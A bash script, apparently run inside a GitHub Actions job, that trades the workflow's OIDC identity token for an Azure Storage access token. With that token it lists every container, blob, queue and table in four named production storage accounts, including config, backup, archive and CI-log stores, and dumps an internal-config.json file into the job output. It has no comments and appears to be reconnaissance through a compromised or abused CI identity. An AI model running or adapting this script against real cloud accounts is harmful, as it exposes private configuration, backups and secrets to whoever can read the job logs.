#!/usr/bin/env bash
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC_URL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
GHJWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$OIDC_URL" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])')
tok(){ curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$GHJWT" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  --data-urlencode "scope=$1" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))'; }
STT=$(tok "https://storage.azure.com/.default")
echo "STT_LEN=${#STT}"
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "########## $sa containers"
  CONT=$(curl -sS -m 15 "https://$sa.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06" | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g')
  echo "$CONT"
  for c in $CONT; do
    echo "===== $sa / $c blobs"
    curl -sS -m 15 "https://$sa.blob.core.windows.net/$c?restype=container&comp=list" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06" | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g' | head -50
  done
done
echo "########## READ internal-config.json"
curl -sS -m 15 "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06"
echo
echo "########## queues+tables"
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "=== $sa queues"
  curl -sS -m 15 "https://$sa.queue.core.windows.net/?comp=list" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06" | grep -oE '<Name>[^<]+</Name>'
  echo "=== $sa tables"
  curl -sS -m 15 "https://$sa.table.core.windows.net/Tables" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06" -H "Accept: application/json;odata=nometadata" | head -c 1500; echo
done
echo DONE
